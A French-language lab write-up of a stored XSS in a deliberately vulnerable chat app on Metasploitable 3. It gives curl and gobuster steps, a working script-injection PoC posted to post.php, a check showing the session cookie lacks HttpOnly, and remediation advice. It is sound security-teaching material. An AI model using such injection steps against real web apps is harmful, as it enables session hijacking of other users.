# Write-up — Chat App : XSS stockée (Metasploitable 3, port 80)

Cible : `172.28.128.3/chat/` · Pas de CVE — appli maison modifiée depuis un tutoriel public.
Résultat : **XSS stockée confirmée**, cookie de session non protégé (`HttpOnly` absent) —
vol de session possible.

Tout ce qui suit est copier-coller direct (testé en zsh), côté 🖥 Kali uniquement.

---

## 1. Recon

Repérée dans le listing du webroot (voir `drupal.md`). Un commentaire HTML dans le code
source révèle l'origine de l'appli :
```bash
curl -s http://172.28.128.3/chat/
```
```html
<!----
This application was downloaded from the following, and modified:
https://code.tutsplus.com/tutorials/how-to-create-a-simple-web-based-chat-application--net-5931
----->
```
**« and modified »** — indice explicite qu'une faille a été introduite volontairement par
rapport au tutoriel d'origine. Formulaire de login minimal (`name`), rien d'autre visible en
surface.

## 2. Démarche d'exploitation — trouver les vrais endpoints

Deviner les noms de fichiers à partir du tutoriel original n'a rien donné (`chat.php`,
`send.php`, etc. — tous en 404). Scan réel avec `gobuster` :
```bash
gobuster dir -u http://172.28.128.3/chat/ -w /usr/share/wordlists/dirb/common.txt -x php -q
```
```
index.php   (Status: 200)
post.php    (Status: 200) [Size: 1]
```
`post.php` existe mais renvoie une réponse vide aux premiers essais — direct en GET/POST
sans les bons paramètres ni la bonne session.

**Piège rencontré : suivre la redirection sans garder les cookies.** Soumettre le
formulaire de login sans `-L` (suivre les redirections) ni cookie jar ne montre que le même
formulaire de login en boucle. En vérifiant en mode verbeux (`curl -v`) :
```bash
curl -v -X POST http://172.28.128.3/chat/index.php -d "name=testuser&enter=Enter"
```
```
< HTTP/1.1 302 Found
< Set-Cookie: PHPSESSID=...; path=/
< Set-Cookie: name=testuser
< Location: index.php
```
Le login fonctionne bien, mais redirige (`302`) vers `index.php` en posant un cookie
`name` — sans `-c`/`-b` (cookie jar) et `-L`, `curl` ne voit jamais la vraie page de chat.
Une fois corrigé :
```bash
curl -s -c cookies.txt -b cookies.txt -L -X POST http://172.28.128.3/chat/index.php -d "name=testuser&enter=Enter"
```
Révèle le vrai JavaScript de la page de chat, qui poste sur `post.php` avec un paramètre
`text` (pas `message` comme deviné au départ) et lit le log via `read_log.php`, rafraîchi
**toutes les secondes** pour tous les clients connectés (`setInterval(loadLog, 1000)`).

## 3. Preuve d'accès — XSS stockée confirmée

```bash
curl -s -b cookies.txt -X POST http://172.28.128.3/chat/post.php --data-urlencode "text=<script>alert('XSS-PoC-testuser')</script>"
curl -s -b cookies.txt http://172.28.128.3/chat/read_log.php
```
```html
<div class='msgln'>(...) <b>testuser</b>: <script>alert('XSS-PoC-testuser')</script><br></div>
```
Le payload `<script>` est inséré **tel quel**, sans échappement, dans la sortie de
`read_log.php` — qui est injectée directement dans le DOM via `$("#chatbox").html(html)`
côté client, **exécutée automatiquement** chez tout utilisateur ayant la page de chat
ouverte (rafraîchissement toutes les secondes, pas besoin qu'il clique sur quoi que ce soit).

**Impact réel confirmé** : le cookie de session n'a pas l'attribut `HttpOnly`
```bash
curl -sI http://172.28.128.3/chat/index.php | grep -i set-cookie
```
```
Set-Cookie: PHPSESSID=f1894699144edf8695d4d8b97be8baec; path=/
```
→ Sans `HttpOnly`, `document.cookie` est accessible depuis un payload JavaScript injecté —
un vrai payload (pas juste `alert()`) pourrait exfiltrer le `PHPSESSID` de n'importe quel
autre utilisateur du chat vers un serveur contrôlé par l'attaquant.

## 4. Point de comparaison — le champ `name` au login, lui, est protégé

Pour vérifier que la faille est spécifique au champ message et pas généralisée, test
d'injection sur le champ `name` (login) :
```bash
curl -s -c cookies2.txt -L -X POST http://172.28.128.3/chat/index.php --data-urlencode "name=<b>INJECTED</b>" -d "enter=Enter"
```
```html
<p class="welcome">Welcome, <b>&lt;b&gt;INJECTED&lt;/b&gt;</b></p>
```
→ **Correctement échappé** (`&lt;b&gt;`). La faille introduite par les auteurs de MS3 est
précise : uniquement sur le chemin message → `post.php` → `read_log.php`, pas sur toutes
les entrées utilisateur de l'appli.

---

## Remédiation

- Échapper systématiquement toute donnée utilisateur avant insertion dans le HTML retourné
  par `read_log.php` (`htmlspecialchars()` en PHP, comme c'est déjà fait correctement pour
  le champ `name`).
- Ajouter l'attribut `HttpOnly` sur le cookie de session (`session.cookie_httponly = 1` dans
  `php.ini`, ou `ini_set()` avant `session_start()`) — empêche le vol de session même en cas
  de XSS résiduelle ailleurs.
- Revoir la politique CORS : `Access-Control-Allow-Origin: *` combiné à
  `Access-Control-Allow-Credentials: true` est une configuration dangereuse, à ne jamais
  combiner.
- Mettre en place une Content-Security-Policy (CSP) restrictive, qui bloquerait l'exécution
  de scripts injectés même en cas d'échappement manqué ailleurs (défense en profondeur).

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), puis les
étapes 2 à 4 dans l'ordre (nécessite un cookie de session valide, obtenu à l'étape 2).

**Suite du parcours MS3 :** `phpmyadmin/`, dernière appli du webroot à explorer.
